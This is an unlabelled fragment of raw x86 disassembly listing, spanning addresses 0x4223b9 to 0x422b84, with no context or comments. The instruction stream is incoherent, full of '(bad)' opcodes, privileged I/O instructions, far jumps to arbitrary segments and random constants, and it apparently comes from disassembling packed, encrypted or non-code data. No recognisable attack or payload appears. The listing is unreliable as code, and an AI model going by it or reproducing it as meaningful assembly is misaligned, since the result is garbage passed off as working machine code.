  4223b9:	jnp    0x4223a6
  4223bb:	loope  0x422348
  4223bd:	inc    ecx
  4223be:	and    al,0x43
  4223c0:	fstp   DWORD PTR [edi]
  4223c2:	icebp  
  4223c3:	mov    BYTE PTR [edx],dh
  4223c5:	lods   al,BYTE PTR ds:[esi]
  4223c6:	pop    ebx
  4223c7:	mov    BYTE PTR [edi-0x7d],ch
  4223ca:	jle    0x4223c3
  4223cc:	pop    ebx
  4223cd:	aas    
  4223ce:	repnz jmp 0x7d11:0xcf1744f7
  4223d6:	push   eax
  4223d7:	inc    ebp
  4223d8:	sbb    eax,esp
  4223da:	ss daa 
  4223dc:	xchg   esp,eax
  4223dd:	mov    edx,edx
  4223df:	aaa    
  4223e0:	gs ins DWORD PTR es:[edi],dx
  4223e2:	xchg   DWORD PTR [eax],esi
  4223e4:	test   BYTE PTR [ecx-0x46],0x6
  4223e8:	dec    ebx
  4223e9:	sti    
  4223ea:	pop    ecx
  4223eb:	sbb    edi,DWORD PTR [edx]
  4223ed:	or     bh,BYTE PTR [ebx+edx*8+0x5f]
  4223f1:	jge    0x4223bd
  4223f3:	(bad)  
  4223f4:	push   ss
  4223f5:	adc    BYTE PTR [ebp+0x2a],ch
  4223f8:	hlt    
  4223f9:	inc    eax
  4223fa:	adc    al,BYTE PTR [ebp-0xee317d7]
  422400:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422401:	shr    DWORD PTR [eax+0x7],0x39
  422405:	inc    eax
  422406:	mov    edi,0xa4dc1bda
  42240b:	xchg   ebp,eax
  42240c:	sbb    DWORD PTR [ebx-0xd],0x1
  422410:	or     ecx,DWORD PTR fs:[ebx]
  422413:	jb     0x42247e
  422415:	les    edx,FWORD PTR [esi+esi*1]
  422418:	clc    
  422419:	imul   eax,DWORD PTR [esi],0x58b9c279
  42241f:	pop    ebx
  422420:	cld    
  422421:	push   ecx
  422422:	pop    ebp
  422423:	int3   
  422424:	push   esp
  422425:	jecxz  0x422427
  422427:	aad    0x34
  422429:	or     bl,0xb5
  42242c:	out    dx,al
  42242d:	and    al,BYTE PTR [esp+ecx*2]
  422430:	les    ecx,FWORD PTR [ecx]
  422432:	inc    esi
  422433:	dec    esi
  422434:	dec    ecx
  422435:	imul   esp,DWORD PTR [ebx+0x3916ce67],0x55
  42243c:	cmp    ch,BYTE PTR [eax+0x36cf5129]
  422442:	test   BYTE PTR [eax+0x6411ad9c],ch
  422448:	lds    esp,FWORD PTR [eax-0x262ae8e7]
  42244e:	repz (bad) 
  422450:	aad    0x90
  422452:	xor    ah,dl
  422454:	mov    esp,0xfc2d5ccd
  422459:	les    eax,FWORD PTR [edi-0x7de68372]
  42245f:	ins    BYTE PTR es:[edi],dx
  422460:	in     al,0xd3
  422462:	icebp  
  422463:	xchg   ecx,eax
  422464:	jne    0x42246c
  422466:	jmp    0x42240c
  422468:	add    esi,0xd9dcce52
  42246e:	outs   dx,DWORD PTR ds:[esi]
  42246f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422470:	pop    es
  422471:	push   esi
  422472:	inc    ebx
  422473:	add    DWORD PTR [edx-0x6b011f9],esi
  422479:	shl    DWORD PTR [ebp-0x2d],1
  42247c:	pop    ds
  42247d:	(bad)  
  42247e:	gs cmp eax,0xcadaa8d9
  422484:	mov    ch,0xfa
  422486:	sub    cl,ah
  422488:	adc    dl,BYTE PTR [ebx+0x76b833e0]
  42248e:	jne    0x422487
  422490:	jmp    DWORD PTR [ebp+0x2b]
  422493:	rcr    BYTE PTR [eax],0xe
  422496:	outs   dx,BYTE PTR ds:[esi]
  422497:	adc    esp,DWORD PTR [ebx]
  422499:	jo     0x4224c5
  42249b:	sub    eax,0x73a15a2e
  4224a0:	and    al,0xef
  4224a2:	ja     0x4224e8
  4224a4:	loop   0x422517
  4224a6:	jbe    0x4224da
  4224a8:	jae    0x4224e7
  4224aa:	ror    dl,cl
  4224ac:	jbe    0x422487
  4224ae:	test   al,0xb8
  4224b0:	mov    al,ds:0xf1c0199f
  4224b5:	outs   dx,BYTE PTR ds:[esi]
  4224b6:	xchg   ebx,eax
  4224b7:	jns    0x4224b8
  4224b9:	jmp    0xf02f9b34
  4224be:	js     0x42250d
  4224c0:	xchg   ebp,eax
  4224c1:	xchg   edx,eax
  4224c2:	inc    DWORD PTR [ecx+0x5d853190]
  4224c8:	loope  0x422515
  4224ca:	cmp    dh,BYTE PTR [ebx+0xf]
  4224cd:	int3   
  4224ce:	cs daa 
  4224d0:	fsub   DWORD PTR [eax]
  4224d2:	push   esi
  4224d3:	pop    esi
  4224d4:	mov    cl,0x64
  4224d6:	mov    eax,ds:0x8ef0703f
  4224db:	mov    dh,BYTE PTR [edx]
  4224dd:	in     eax,0xfa
  4224df:	xchg   ecx,eax
  4224e0:	das    
  4224e1:	ja     0x42248a
  4224e3:	in     eax,dx
  4224e4:	inc    esi
  4224e5:	aam    0xbc
  4224e7:	(bad)  
  4224e8:	in     al,dx
  4224e9:	pop    esp
  4224ea:	sbb    DWORD PTR ds:0xf223b428,edi
  4224f0:	fisttp WORD PTR [esi-0x1a]
  4224f3:	cs xchg esp,eax
  4224f5:	jae    0x4224af
  4224f7:	mov    ebx,DWORD PTR [eax]
  4224f9:	dec    edx
  4224fa:	std    
  4224fb:	push   ebx
  4224fc:	or     BYTE PTR [ecx+0x2de2e134],bl
  422502:	xor    edi,DWORD PTR [ebp+0x6d1f7c1d]
  422508:	mov    ch,0x10
  42250a:	(bad)  
  42250b:	or     DWORD PTR [edx+0x5aa87098],ebp
  422511:	fwait
  422512:	xchg   edx,eax
  422513:	sub    cl,dh
  422515:	cmp    ah,0x29
  422518:	or     BYTE PTR [esi-0x3aee1015],ch
  42251e:	xchg   esp,eax
  42251f:	and    ebx,eax
  422521:	inc    ecx
  422522:	es push edx
  422524:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422525:	pop    edi
  422526:	js     0x42258f
  422528:	popa   
  422529:	(bad)  
  42252a:	push   edi
  42252c:	xchg   esp,eax
  42252d:	loopne 0x422597
  42252f:	rcl    DWORD PTR [ecx-0xc],1
  422532:	ins    DWORD PTR es:[edi],dx
  422533:	push   ds
  422534:	xchg   ecx,eax
  422535:	push   edx
  422536:	adc    al,0x7a
  422538:	inc    edi
  422539:	arpl   WORD PTR [esi+ecx*4+0x6c],sp
  42253d:	inc    edi
  42253e:	imul   ebx,DWORD PTR [edi+0x70],0xe8150f1b
  422545:	xchg   ebx,eax
  422546:	dec    esp
  422547:	popf   
  422548:	push   ebx
  422549:	iret   
  42254a:	push   0xdcde9691
  42254f:	adc    dh,BYTE PTR [edi+0x75]
  422552:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422553:	js     0x4225d2
  422555:	aaa    
  422556:	push   esi
  422557:	jecxz  0x42256e
  422559:	push   DWORD PTR [ebp+0x331c189c]
  42255f:	sub    DWORD PTR [edx],edi
  422561:	loop   0x4225de
  422563:	fs jmp 0x422590
  422566:	fadd   st(3),st
  422568:	mov    DWORD PTR [edi-0x4],edx
  42256b:	dec    ebx
  42256c:	dec    esi
  42256d:	inc    esp
  42256e:	fisttp WORD PTR [eax]
  422570:	add    DWORD PTR [eax+edx*2-0x2b],esp
  422574:	push   ss
  422575:	pop    ebx
  422576:	push   ebp
  422577:	sub    esi,DWORD PTR [edi-0x5401cb3e]
  42257d:	mov    ds:0x7bf89b47,al
  422582:	lods   eax,DWORD PTR ds:[esi]
  422583:	mov    ebx,0xcf994007
  422588:	lds    edx,FWORD PTR [eax-0x2bf738b2]
  42258e:	sbb    al,BYTE PTR [ebx-0x6]
  422591:	ins    BYTE PTR es:[edi],dx
  422592:	(bad)  [eax+0x1f]
  422595:	ret    
  422596:	mov    edx,0x9c0d24a
  42259b:	mov    ecx,0xc1d79b52
  4225a0:	jp     0x42253a
  4225a2:	daa    
  4225a3:	mov    ah,0x7b
  4225a5:	loop   0x422574
  4225a7:	(bad)
  4225ab:	pusha  
  4225ac:	push   esp
  4225ad:	mov    al,ds:0xf6274301
  4225b2:	lds    ebp,FWORD PTR ds:0xc530e59f
  4225b8:	push   esi
  4225b9:	sti    
  4225ba:	cwde   
  4225bb:	bound  ecx,QWORD PTR [edi+0x6d]
  4225be:	pop    edx
  4225bf:	jmp    0x3d051615
  4225c4:	and    eax,0x7f6a3d50
  4225c9:	or     DWORD PTR [eax],0xffffff96
  4225cc:	ins    BYTE PTR es:[edi],dx
  4225cd:	cmp    eax,0x2a26e544
  4225d2:	jne    0x42258d
  4225d4:	pop    esi
  4225d5:	ins    DWORD PTR es:[edi],dx
  4225d6:	or     DWORD PTR [eax],edi
  4225d8:	sahf   
  4225d9:	dec    edi
  4225da:	ror    BYTE PTR [ecx],cl
  4225dc:	gs mov edx,0x188ccc0
  4225e2:	mov    al,ds:0xfa83b54c
  4225e7:	into   
  4225e8:	and    ch,cl
  4225ea:	jo     0x422611
  4225ec:	stos   DWORD PTR es:[edi],eax
  4225ed:	in     eax,dx
  4225ee:	mov    ebx,0xd3183af5
  4225f3:	ret    0x6a71
  4225f6:	int3   
  4225f7:	cwde   
  4225f8:	int3   
  4225f9:	push   ds
  4225fa:	loopne 0x4225a1
  4225fc:	mov    ch,0xbb
  4225fe:	rcl    BYTE PTR [edx+0x38],cl
  422601:	inc    BYTE PTR [ebp+0x75073256]
  422607:	and    eax,0xdc0d138f
  42260c:	and    DWORD PTR [eax-0x51],edx
  42260f:	pushw  es
  422611:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422612:	(bad)
  422615:	push   cs
  422616:	pop    ebx
  422617:	or     DWORD PTR [ebx-0x5e6372cd],esp
  42261d:	jo     0x422633
  42261f:	scas   eax,DWORD PTR es:[edi]
  422620:	outs   dx,DWORD PTR ds:[esi]
  422621:	pop    edi
  422622:	shl    DWORD PTR [edx],0x95
  422625:	push   0x576a71d0
  42262a:	inc    edx
  42262b:	xchg   BYTE PTR ds:0x41e640c6,cl
  422631:	je     0x4225b8
  422633:	push   0xfe872fba
  422638:	(bad)  
  42263a:	icebp  
  42263b:	jmp    0x53ba:0x1b064b45
  422642:	mov    ebp,0xde6d0ddc
  422647:	xchg   esp,eax
  422648:	arpl   WORD PTR [ebp-0x6e],ax
  42264b:	mov    ebp,DWORD PTR [ebp+0x59]
  42264e:	sbb    bh,BYTE PTR ss:[edi+0x36ad6fe6]
  422655:	inc    edx
  422656:	inc    ebp
  422657:	retf   0xe219
  42265a:	aam    0x4
  42265c:	dec    ebp
  42265d:	leave  
  42265e:	icebp  
  42265f:	(bad)  
  422660:	sbb    dh,BYTE PTR [edx]
  422662:	int3   
  422663:	and    edx,DWORD PTR [edx+0x5b62c2af]
  422669:	aad    0x74
  42266b:	mov    ah,0xdb
  42266d:	inc    edx
  42266e:	aad    0x50
  422670:	popa   
  422671:	sub    BYTE PTR [edx],dh
  422673:	sbb    ah,dh
  422675:	xor    ebx,DWORD PTR [esi]
  422677:	in     al,0x54
  422679:	(bad)  
  42267a:	lock adc BYTE PTR [ebx+ecx*1],bl
  42267e:	pushf  
  42267f:	sti    
  422680:	push   ss
  422681:	fstp   DWORD PTR [ecx+esi*1]
  422684:	rol    BYTE PTR [ebx+ebp*4],cl
  422687:	out    dx,al
  422688:	adc    ch,cl
  42268a:	jb     0x422617
  42268c:	gs lahf 
  42268e:	cmp    BYTE PTR [edx],al
  422690:	shl    DWORD PTR [ecx+0x3352939d],0x25
  422697:	mov    al,BYTE PTR [ebx-0x4]
  42269a:	cmp    ah,bh
  42269c:	sub    ebx,esp
  42269e:	popa   
  42269f:	or     eax,0x6c76756f
  4226a4:	jo     0x422663
  4226a6:	mov    edx,0x4a769b55
  4226ab:	mov    al,0x8f
  4226ad:	dec    ecx
  4226ae:	pop    ebp
  4226af:	js     0x4226a9
  4226b1:	sbb    eax,0xf574fd5
  4226b6:	sub    ebx,DWORD PTR [ecx-0x297d41c]
  4226bc:	sub    ebp,DWORD PTR [edi+edx*1-0x1f]
  4226c0:	mov    eax,0x681a51de
  4226c5:	es inc esi
  4226c7:	in     eax,0xc1
  4226c9:	mov    esi,0x89e4175a
  4226ce:	and    al,0xfa
  4226d0:	inc    edi
  4226d1:	or     eax,0x8bed6816
  4226d6:	int3   
  4226d7:	iret   
  4226d8:	stos   BYTE PTR es:[edi],al
  4226d9:	or     ch,BYTE PTR [eax+0x24]
  4226dc:	iret   
  4226dd:	adc    DWORD PTR [ebx+0x7e],0xffffff9a
  4226e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226e2:	sub    DWORD PTR [esi],0xffffffce
  4226e5:	cld    
  4226e6:	xchg   esi,eax
  4226e7:	push   ebp
  4226e8:	mov    ds:0x37d05bde,al
  4226ed:	xchg   ebp,eax
  4226ee:	jo     0x422680
  4226f0:	jb     0x42274b
  4226f2:	add    ecx,edx
  4226f4:	js     0x42269a
  4226f6:	iret   
  4226f7:	les    esp,FWORD PTR [edi+0x64]
  4226fa:	pusha  
  4226fb:	(bad)  
  4226fc:	xchg   ecx,eax
  4226fd:	mov    dl,0x49
  4226ff:	pop    edi
  422700:	out    0xe,eax
  422702:	mov    cl,0x48
  422704:	and    al,0xbf
  422706:	imul   ebx,esi,0x6d
  422709:	xlat   BYTE PTR ds:[ebx]
  42270a:	ja     0x422756
  42270c:	mov    ah,0xb0
  42270e:	cli    
  42270f:	or     esp,DWORD PTR [eax]
  422711:	add    ah,dh
  422713:	cmp    al,0xf2
  422715:	jecxz  0x422714
  422717:	inc    ebx
  422718:	popa   
  422719:	mov    al,ds:0xd8797872
  42271e:	lods   al,BYTE PTR ds:[esi]
  42271f:	sbb    DWORD PTR [edx-0x11],esp
  422722:	sub    ch,BYTE PTR [ebp-0x75f1a2d6]
  422728:	aam    0x7a
  42272a:	mov    bh,0x6d
  42272c:	push   ss
  42272d:	or     eax,0xb7e99ec
  422732:	daa    
  422733:	sub    al,al
  422735:	les    edi,FWORD PTR [eax+0x33]
  422738:	out    0xe5,eax
  42273a:	aam    0xcb
  42273c:	sbb    bh,BYTE PTR [esi+0x55]
  42273f:	mov    al,ds:0xf6cc0cb9
  422744:	push   esp
  422745:	fld    st(2)
  422747:	ror    bh,cl
  422749:	inc    ebp
  42274a:	xchg   edi,eax
  42274b:	xor    DWORD PTR [edi+edi*4-0x7738da47],0x5a0d5b5a
  422756:	popa   
  422757:	push   es
  422758:	mov    cl,0x20
  42275a:	xor    eax,0x55ff2609
  42275f:	ret    
  422760:	mov    DWORD PTR [esi+0x5e],ecx
  422763:	xchg   ecx,eax
  422764:	call   0xd0afff95
  422769:	add    dh,BYTE PTR [ecx+0x19380780]
  42276f:	es dec esi
  422771:	in     al,dx
  422772:	cdq    
  422773:	fcom   QWORD PTR [ecx]
  422775:	in     eax,dx
  422776:	test   eax,0xf1e8687d
  42277b:	cmc    
  42277c:	inc    esi
  42277d:	fsub   QWORD PTR [esi+edi*4]
  422780:	mov    dh,0x66
  422782:	xor    eax,0xe47995d0
  422787:	and    dh,BYTE PTR [esi]
  422789:	test   DWORD PTR [edi+0x47556ccd],edx
  42278f:	outs   dx,DWORD PTR ds:[esi]
  422790:	mov    ah,0x48
  422792:	jns    0x42274a
  422794:	sbb    dl,BYTE PTR [ebp+ecx*8-0x148c5d96]
  42279b:	push   0xffffffe1
  42279d:	cld    
  42279e:	push   edx
  42279f:	lods   al,BYTE PTR ds:[esi]
  4227a0:	(bad)  
  4227a2:	or     esp,DWORD PTR [esi-0x27]
  4227a5:	xor    bl,bl
  4227a7:	int3   
  4227a8:	sub    DWORD PTR [esi],esi
  4227aa:	sbb    BYTE PTR [ebp+0x67],dl
  4227ad:	add    BYTE PTR [ebx+0x75],al
  4227b0:	pop    ebx
  4227b1:	je     0x42281d
  4227b3:	stc    
  4227b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4227b5:	imul   ebx,esi,0x63
  4227b8:	lahf   
  4227b9:	or     DWORD PTR [edx-0x1c2c2b6a],eax
  4227bf:	fadd   DWORD PTR [edx-0x68fb3440]
  4227c5:	add    eax,0xe7a5a0f7
  4227ca:	out    dx,al
  4227cb:	or     ch,dl
  4227cd:	mov    ds,WORD PTR [edi-0x23]
  4227d0:	jl     0x42276e
  4227d2:	call   0x9d5a:0xc4bdb12
  4227d9:	(bad)  
  4227da:	pop    ebp
  4227db:	test   DWORD PTR [eax+ebp*8+0x6c361e2],edi
  4227e2:	stos   BYTE PTR es:[edi],al
  4227e3:	jns    0x4227a0
  4227e5:	ffreep st(5)
  4227e7:	iret   
  4227e8:	mov    ds:0x91879711,al
  4227ed:	and    edx,0x16
  4227f0:	stos   BYTE PTR es:[edi],al
  4227f1:	jo     0x422826
  4227f3:	out    dx,al
  4227f4:	push   ecx
  4227f5:	jnp    0x42283e
  4227f7:	push   ebp
  4227f8:	shl    DWORD PTR [edx-0x34bb0c2],0xdb
  4227ff:	in     al,0x27
  422801:	shr    ecx,1
  422803:	jge    0x422816
  422805:	sbb    WORD PTR [edx-0x7e8f31e7],dx
  42280c:	jmp    0xfc36:0xe4515f2e
  422813:	retf   
  422814:	mov    ss,WORD PTR [ecx+ebp*8+0x3c74eae6]
  42281b:	imul   eax,DWORD PTR [ecx],0x4479f2fe
  422821:	mov    dh,bh
  422823:	cld    
  422824:	fldenv [esi]
  422826:	js     0x42280a
  422828:	std    
  422829:	idiv   DWORD PTR [esi+0x59ae1586]
  42282f:	sub    eax,0x3c69072d
  422834:	and    ah,BYTE PTR [edx-0x58c4c83]
  42283a:	aam    0x18
  42283c:	imul   BYTE PTR [ebp+0x2645db68]
  422842:	test   BYTE PTR [ecx-0x72c3477c],cl
  422848:	(bad)  
  422849:	fld    DWORD PTR [ecx+0x48f75ba8]
  42284f:	push   edx
  422850:	push   eax
  422851:	mov    ebx,0xb4e2956c
  422856:	jp     0x422887
  422858:	jg     0x42285d
  42285a:	ficomp WORD PTR [ecx+0x1b3c70a1]
  422860:	nop
  422861:	or     eax,0xba77844c
  422866:	sbb    al,0xe8
  422868:	adc    bl,BYTE PTR [esi+ebp*1]
  42286b:	xor    BYTE PTR [edi],bh
  42286d:	ret    0x119e
  422870:	fidiv  DWORD PTR [ebp-0x4]
  422873:	cdq    
  422874:	or     ch,bl
  422876:	aad    0xea
  422878:	call   0x9060d9b4
  42287d:	fwait
  42287e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42287f:	push   esi
  422880:	dec    ecx
  422881:	fild   DWORD PTR [esi+0x7]
  422884:	int    0x9e
  422886:	and    al,0x49
  422888:	sbb    al,0x7f
  42288a:	cmovge edx,DWORD PTR [esi+0x5d]
  42288e:	adc    DWORD PTR [eax+0x26],esp
  422891:	sbb    al,0x3c
  422893:	sub    ah,BYTE PTR [edx]
  422895:	sbb    ebp,DWORD PTR [eax]
  422897:	sbb    eax,0xb94cf52f
  42289c:	(bad)  
  42289d:	mov    esp,0x8243986d
  4228a2:	in     al,dx
  4228a3:	repz lahf 
  4228a5:	pop    ebx
  4228a6:	pop    es
  4228a7:	cdq    
  4228a8:	sbb    al,0x2d
  4228aa:	cdq    
  4228ab:	mov    esp,ebx
  4228ad:	jmp    0xd6a03c20
  4228b2:	sbb    esp,0xffffffe3
  4228b5:	out    0xd0,al
  4228b7:	xchg   esi,eax
  4228b8:	sbb    esp,ebx
  4228ba:	mov    ebp,ecx
  4228bc:	inc    esi
  4228bd:	push   ecx
  4228be:	jmp    0x4228d1
  4228c0:	pop    eax
  4228c1:	cmp    eax,0xbe8ef60
  4228c6:	out    dx,eax
  4228c7:	jecxz  0x4228f8
  4228c9:	pop    ecx
  4228ca:	iret   
  4228cb:	mov    esi,0x376335a2
  4228d0:	outs   dx,BYTE PTR ds:[esi]
  4228d1:	das    
  4228d2:	out    0xdb,eax
  4228d4:	jmp    0x42285f
  4228d6:	ins    BYTE PTR es:[di],dx
  4228d8:	jge    0x4228b1
  4228da:	pop    edi
  4228db:	adc    al,0xb7
  4228dd:	pop    esi
  4228de:	xor    DWORD PTR [edi+0x73],esi
  4228e1:	push   ecx
  4228e2:	(bad)  
  4228e3:	iret   
  4228e4:	or     BYTE PTR [eax-0x24],ah
  4228e7:	and    cl,BYTE PTR [ecx+0x1928d281]
  4228ed:	jl     0x4228db
  4228ef:	xchg   edi,eax
  4228f0:	add    al,0xaa
  4228f2:	inc    edx
  4228f3:	fbstp  TBYTE PTR [edx-0x27f45358]
  4228f9:	mov    al,0x68
  4228fb:	push   edx
  4228fc:	push   esp
  4228fd:	jge    0x422880
  4228ff:	sub    bh,BYTE PTR [edx+edi*8]
  422902:	inc    esp
  422903:	cmp    bh,dl
  422905:	sub    eax,0xa34749b8
  42290a:	sahf   
  42290b:	jmp    0xc8a64612
  422910:	ds jmp 0x53e49346
  422916:	xor    eax,0xfaf1a0f7
  42291b:	inc    ecx
  42291c:	push   ecx
  42291d:	cld    
  42291e:	daa    
  42291f:	(bad)  
  422920:	jecxz  0x4228d5
  422922:	bnd jno 0x4228bd
  422925:	jl     0x4228c3
  422927:	shl    DWORD PTR [eax],1
  422929:	sub    eax,DWORD PTR [edi+0x41]
  42292c:	shl    dl,cl
  42292e:	outs   dx,DWORD PTR ds:[esi]
  42292f:	jb     0x422983
  422931:	js     0x4228d0
  422933:	(bad)  
  422934:	nop
  422935:	nop
  422936:	dec    edx
  422937:	sbb    cl,BYTE PTR [edi]
  422939:	test   al,bl
  42293b:	stos   BYTE PTR es:[edi],al
  42293c:	push   ebx
  42293d:	int    0xaf
  42293f:	pop    edx
  422940:	gs mov ecx,0x874361ed
  422946:	popf   
  422947:	and    al,0xbd
  422949:	stc    
  42294a:	cld    
  42294b:	out    dx,al
  42294c:	lahf   
  42294d:	sub    ecx,DWORD PTR [edx+ecx*4-0x79e8522d]
  422954:	lock or bl,BYTE PTR [eax+0x504de32f]
  42295b:	sub    DWORD PTR [ebx-0x42],0xffffff8e
  42295f:	jbe    0x42290b
  422961:	lock nop
  422963:	imul   eax,DWORD PTR [esi],0xffffffee
  422966:	xlat   BYTE PTR ds:[bx]
  422968:	push   ds
  422969:	cld    
  42296a:	jno    0x42290a
  42296c:	leave  
  42296d:	xchg   DWORD PTR [edi-0x7b],ebx
  422970:	sbb    ah,BYTE PTR [eax]
  422972:	repz lock je 0x4229c6
  422976:	cmc    
  422977:	push   esp
  422978:	(bad)  
  422979:	std    
  42297a:	dec    ecx
  42297b:	pop    esp
  42297c:	fdivr  QWORD PTR [ecx+0x7d]
  42297f:	jl     0x42294c
  422981:	add    al,0x16
  422983:	mov    bh,0x98
  422985:	adc    ecx,DWORD PTR [edx]
  422987:	sub    BYTE PTR [edx],cl
  422989:	ret    0x66aa
  42298c:	retf   
  42298d:	sbb    DWORD PTR [ebx+0x25],0xffffff8b
  422991:	pop    es
  422992:	cmp    al,dl
  422994:	jno    0x4229bd
  422996:	mov    dl,0x6f
  422998:	inc    edi
  422999:	inc    eax
  42299a:	push   edi
  42299b:	mov    al,ds:0x3e7d365a
  4229a0:	data16 mov al,0x49
  4229a3:	pusha  
  4229a4:	shl    DWORD PTR [eax-0x4e],cl
  4229a7:	lea    esp,[edx-0x57]
  4229aa:	psubw  mm3,mm6
  4229ad:	dec    ebx
  4229ae:	jbe    0x4229b8
  4229b0:	sub    BYTE PTR [edx],bl
  4229b2:	inc    edi
  4229b3:	mov    dh,BYTE PTR [eax-0x79]
  4229b6:	fs push ecx
  4229b8:	inc    esi
  4229b9:	jae    0x4229b6
  4229bb:	ja     0x422963
  4229bd:	pop    es
  4229be:	mov    ebp,0x85ca7447
  4229c3:	mov    WORD PTR [edi-0x1ebae934],?
  4229c9:	sbb    bl,BYTE PTR [edi-0x3c]
  4229cc:	sbb    eax,0x16340983
  4229d1:	mov    ecx,0x72b92a52
  4229d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4229d7:	xchg   ecx,eax
  4229d8:	mov    ds:0x85b66281,eax
  4229dd:	xor    al,0xe6
  4229df:	add    eax,0xc030ed86
  4229e4:	mov    edi,0x1a691d29
  4229e9:	pop    ebx
  4229ea:	sub    BYTE PTR [esi+0x4c3984ba],ch
  4229f0:	mov    cl,0x95
  4229f2:	jno    0x4229d4
  4229f4:	out    0xf7,al
  4229f6:	xor    eax,0x898c42c5
  4229fb:	cmp    ah,BYTE PTR [edi-0x36]
  4229fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4229ff:	test   eax,0xf681e07c
  422a04:	and    edx,DWORD PTR [edi+edi*4]
  422a07:	mov    bl,0x66
  422a09:	push   eax
  422a0a:	add    DWORD PTR [edx+0x676942c8],0x6b274511
  422a14:	push   esi
  422a15:	xchg   edx,eax
  422a16:	adc    eax,esp
  422a18:	add    ah,al
  422a1a:	call   0x81863591
  422a1f:	dec    edi
  422a20:	mov    DWORD PTR [ecx-0x4fe78c4a],eax
  422a26:	pop    ebp
  422a27:	mov    dl,0x76
  422a29:	push   es
  422a2a:	xor    al,0x8a
  422a2c:	and    BYTE PTR [edi+0x637d475c],bh
  422a32:	ds xor eax,0x5d04d83c
  422a38:	repz lock push ds
  422a3b:	push   eax
  422a3c:	jecxz  0x422a80
  422a3e:	cmc    
  422a3f:	jl     0x422a95
  422a41:	mov    dh,0x1c
  422a43:	add    eax,0x1333748c
  422a48:	bound  eax,QWORD PTR [edi-0xe]
  422a4b:	mov    BYTE PTR [esi],cl
  422a4d:	xchg   ebp,eax
  422a4e:	ret    0xbefc
  422a51:	mul    eax
  422a53:	ins    BYTE PTR es:[edi],dx
  422a54:	test   esi,0xb682d714
  422a5a:	in     eax,dx
  422a5b:	xor    esi,ebx
  422a5d:	cdq    
  422a5e:	jo     0x422abd
  422a60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422a61:	ffree  st(5)
  422a63:	dec    ecx
  422a64:	add    ebx,DWORD PTR ds:0x80179ace
  422a6a:	(bad)  
  422a6b:	mov    ebp,0xf85ce53e
  422a70:	or     eax,0x7263d646
  422a75:	add    bh,BYTE PTR [ebx+0x1607d02e]
  422a7b:	sbb    edi,0xffffffb3
  422a7e:	in     eax,0xdd
  422a80:	outs   dx,BYTE PTR ds:[esi]
  422a81:	nop
  422a82:	dec    bl
  422a84:	pop    ds
  422a85:	ret    0xbb4a
  422a88:	xor    cl,BYTE PTR [esi-0x571c0ce3]
  422a8e:	std    
  422a8f:	adc    al,0xb
  422a91:	push   0x8664737f
  422a96:	mov    ss,ebx
  422a98:	pop    ecx
  422a99:	lea    edi,[esi-0x2b]
  422a9c:	mov    ds,WORD PTR [ebx+0x65]
  422a9f:	fadd   QWORD PTR [ebx-0x52]
  422aa2:	adc    bl,BYTE PTR [ebp-0x6cb0b0ae]
  422aa8:	mov    bl,0x60
  422aaa:	mov    edx,0xdd159acd
  422aaf:	js     0x422a9d
  422ab1:	mov    ebp,0x956936a5
  422ab6:	xor    DWORD PTR [eax],0x80e6d35e
  422abc:	mov    dh,0xe0
  422abe:	add    DWORD PTR [edi],esp
  422ac0:	sahf   
  422ac1:	push   eax
  422ac2:	jmp    0x4134256
  422ac7:	mov    eax,ds:0x4ae4f9dd
  422acc:	fcom   QWORD PTR [eax-0x62]
  422acf:	aaa    
  422ad0:	cmp    BYTE PTR [esp+edx*8+0x3b7bc699],al
  422ad7:	xchg   BYTE PTR [edi-0x24a828fb],dl
  422add:	xchg   ecx,eax
  422ade:	sub    al,0x7e
  422ae0:	mov    ebp,DWORD PTR [edi]
  422ae2:	shr    DWORD PTR [esi+0x624e747],0x88
  422ae9:	add    BYTE PTR ds:0x9f557150,al
  422aef:	push   ecx
  422af0:	dec    bx
  422af2:	and    DWORD PTR [edx-0x77],0x6
  422af6:	fnstcw WORD PTR [edx+0x52]
  422af9:	fstp   DWORD PTR ds:0x2b756cdf
  422aff:	loopne 0x422b2b
  422b01:	jae    0x422b05
  422b03:	js     0x422b2c
  422b05:	shl    DWORD PTR [edx+0x2e99e82a],1
  422b0b:	dec    eax
  422b0c:	bound  edx,QWORD PTR [ebx+0x16]
  422b0f:	dec    edi
  422b10:	lock lahf 
  422b12:	out    dx,al
  422b13:	fsub   QWORD PTR [ebx-0x31a68231]
  422b19:	adc    ebp,DWORD PTR [ecx]
  422b1b:	out    0x7d,eax
  422b1d:	or     ebx,DWORD PTR [ebp-0x41]
  422b20:	mov    al,BYTE PTR [eax]
  422b22:	dec    ebp
  422b23:	int    0xe3
  422b25:	mov    WORD PTR [ebp+0x2cd8d447],?
  422b2b:	ret    0xe89d
  422b2e:	inc    ecx
  422b2f:	retf   0xfc65
  422b32:	or     BYTE PTR [ecx+0x48b482ef],cl
  422b38:	daa    
  422b39:	cmp    dl,BYTE PTR [edi]
  422b3b:	repz jge 0x422bbb
  422b3e:	leave  
  422b3f:	(bad)  
  422b40:	sahf   
  422b41:	test   DWORD PTR [ebx],eax
  422b43:	mov    ebx,0xbe681d6d
  422b48:	ins    DWORD PTR es:[edi],dx
  422b49:	xlat   BYTE PTR ds:[ebx]
  422b4a:	lea    ebx,[edx-0x44]
  422b4d:	lock test DWORD PTR [ebp+0x19e954b9],ecx
  422b54:	and    eax,0x528b7909
  422b59:	xchg   esp,eax
  422b5a:	mov    bh,BYTE PTR [eax-0xd3cd514]
  422b60:	out    0x28,al
  422b62:	popf   
  422b63:	mov    DWORD PTR [esi+0x3c],eax
  422b66:	sbb    eax,0xf3344d8b
  422b6b:	loope  0x422bd0
  422b6d:	cmp    cl,BYTE PTR [ebx+0xa]
  422b70:	in     al,dx
  422b71:	add    ah,dh
  422b73:	mov    cl,0xca
  422b75:	mov    edx,0x1f371a39
  422b7a:	nop
  422b7b:	mov    dl,0xad
  422b7d:	xor    eax,0xf97e329a
  422b82:	sbb    al,0x40
  422b84:	enter  0xb1d8,0x56
